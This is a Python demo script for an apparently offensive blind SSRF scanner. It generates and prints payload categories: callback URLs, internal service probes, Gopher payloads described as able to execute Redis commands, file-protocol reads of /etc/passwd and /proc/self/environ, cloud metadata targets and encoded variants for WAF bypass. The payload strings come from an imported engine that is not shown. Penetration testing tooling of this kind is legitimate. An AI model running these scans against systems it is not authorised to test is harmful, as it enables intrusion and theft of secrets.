"""
Advanced SSRF Payloads Demo

Demonstrates all payload types including:
- Internal service probes (MySQL, Redis, PostgreSQL, etc.)
- Gopher protocol for service interaction
- File protocol for local file access
- Encoded variations for WAF bypass
"""

import sys
import os

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from bssrf.modules.blind_ssrf.payloads import SSRFPayloadEngine


def print_section(title):
    """Print formatted section header."""
    print("\n" + "=" * 60)
    print(f" {title}")
    print("=" * 60)


def demo_basic_payloads():
    """Show basic SSRF payload types."""
    print_section("BASIC SSRF PAYLOADS")
    
    engine = SSRFPayloadEngine("http://your-callback-server.com")
    callback_id = "demo-callback-123"
    
    payloads = engine.get_all_payloads(callback_id)
    
    print("\n[+] Generated 6 basic payload types:\n")
    for payload_type, payload_url in payloads.items():
        print(f"  [{payload_type.upper()}]")
        print(f"    {payload_url}\n")


def demo_internal_services():
    """Show internal service probing payloads."""
    print_section("INTERNAL SERVICE PROBES")
    
    engine = SSRFPayloadEngine("http://your-callback-server.com")
    callback_id = "service-probe-456"
    
    payloads = engine.generate_internal_service_payloads(callback_id)
    
    print(f"\n[+] Generated {len(payloads)} internal service payloads:")
    print("    Targeting: MySQL, PostgreSQL, Redis, MongoDB, Elasticsearch,")
    print("               RabbitMQ, Memcached, SSH, Admin panels\n")
    
    # Show a few examples
    print("  Examples:")
    for i, payload in enumerate(payloads[:5]):
        print(f"    {i+1}. {payload}")
    print(f"    ... and {len(payloads) - 5} more")


def demo_gopher_protocol():
    """Show Gopher protocol payloads."""
    print_section("GOPHER PROTOCOL PAYLOADS")
    
    engine = SSRFPayloadEngine("http://your-callback-server.com")
    callback_id = "gopher-test-789"
    
    payloads = engine.generate_gopher_payloads(callback_id)
    
    print(f"\n[+] Generated {len(payloads)} Gopher protocol payloads:")
    print("    Can interact with: Redis, FastCGI, Memcached, SMTP\n")
    
    for i, payload in enumerate(payloads, 1):
        print(f"  {i}. {payload}")
    
    print("\n[!] Gopher can be used to:")
    print("    - Execute commands on Redis")
    print("    - Interact with FastCGI backends")
    print("    - Query Memcached")
    print("    - Send SMTP commands")


def demo_file_protocol():
    """Show File protocol payloads."""
    print_section("FILE PROTOCOL PAYLOADS")
    
    engine = SSRFPayloadEngine("http://your-callback-server.com")
    callback_id = "file-read-999"
    
    payloads = engine.generate_file_protocol_payloads(callback_id)
    
    print(f"\n[+] Generated {len(payloads)} File protocol payloads:")
    print("    Can read local files or access UNC paths\n")
    
    for i, payload in enumerate(payloads, 1):
        print(f"  {i}. {payload}")
    
    print("\n[!] File protocol can read:")
    print("    - /etc/passwd (Linux users)")
    print("    - /etc/hosts (Network config)")
    print("    - /proc/self/environ (Process environment)")
    print("    - C:/Windows/win.ini (Windows system files)")


def demo_encoded_variations():
    """Show encoded payload variations."""
    print_section("ENCODED PAYLOAD VARIATIONS")
    
    engine = SSRFPayloadEngine("http://your-callback-server.com")
    callback_id = "encoded-bypass-777"
    
    base_payload = "http://localhost:8080/admin"
    encoded = engine.generate_encoded_payloads(base_payload, callback_id)
    
    print(f"\n[+] Base payload: {base_payload}")
    print(f"[+] Generated {len(encoded)} encoded variations for WAF bypass:\n")
    
    for i, payload in enumerate(encoded, 1):
        print(f"  {i}. {payload}")
    
    print("\n[!] Encoding techniques used:")
    print("    - URL encoding (%XX format)")
    print("    - Double URL encoding")
    print("    - Case variations (HTTP, HtTp)")
    print("    - Decimal IP encoding (127.0.0.1)")
    print("    - Hexadecimal IP encoding (0x7f.0x0.0x0.0x1)")
    print("    - Octal IP encoding (0177.0.0.0.1)")
    print("    - IPv6 format ([::1])")


def demo_comprehensive_scan():
    """Show what a comprehensive scan looks like."""
    print_section("COMPREHENSIVE SCAN MODE")
    
    engine = SSRFPayloadEngine("http://your-callback-server.com")
    callback_id = "full-scan-888"
    
    # Get all payload categories
    basic = engine.get_all_payloads(callback_id)
    advanced = engine.get_advanced_payloads(callback_id)
    encoded = engine.get_encoded_variations(callback_id)
    
    total_basic = len(basic)
    total_advanced = sum(len(v) for v in advanced.values())
    total_encoded = sum(len(v) for v in encoded.values())
    total = total_basic + total_advanced + total_encoded
    
    print("\n[+] Comprehensive SSRF scan includes:\n")
    print(f"  Basic Payloads:    {total_basic:3d} payloads")
    print(f"  Advanced Payloads: {total_advanced:3d} payloads")
    print(f"  Encoded Variants:  {total_encoded:3d} payloads")
    print(f"  " + "-" * 30)
    print(f"  TOTAL:             {total:3d} payloads\n")
    
    print("  Categories:")
    print(f"    - DNS exfiltration")
    print(f"    - HTTP callbacks")
    print(f"    - Cloud metadata (AWS, Azure, GCP)")
    print(f"    - Localhost probing")
    print(f"    - Internal IP ranges")
    print(f"    - Internal services ({len(advanced.get('internal_services', []))} targets)")
    print(f"    - Gopher protocol ({len(advanced.get('gopher', []))} payloads)")
    print(f"    - File protocol ({len(advanced.get('file_protocol', []))} payloads)")
    print(f"    - URL encoding variations")
    print(f"    - IP encoding variations")


def main():
    """Run all demonstrations."""
    print("\n")
    print("#" * 60)
    print("#  ADVANCED SSRF PAYLOADS DEMONSTRATION")
    print("#" * 60)
    
    # Run all demos
    demo_basic_payloads()
    demo_internal_services()
    demo_gopher_protocol()
    demo_file_protocol()
    demo_encoded_variations()
    demo_comprehensive_scan()
    
    print("\n" + "=" * 60)
    print(" DEMONSTRATION COMPLETE")
    print("=" * 60)
    print("\nTo use advanced payloads in scanning:")
    print("  1. Initialize module with use_advanced=True")
    print("  2. Run scan as normal")
    print("  3. All advanced payloads will be tested automatically\n")
    print("Example:")
    print('  module = BlindSSRFModule("http://callback.com", use_advanced=True)')
    print('  findings = module.scan_url("http://target.com?url=test")')
    print()


if __name__ == "__main__":
    main()
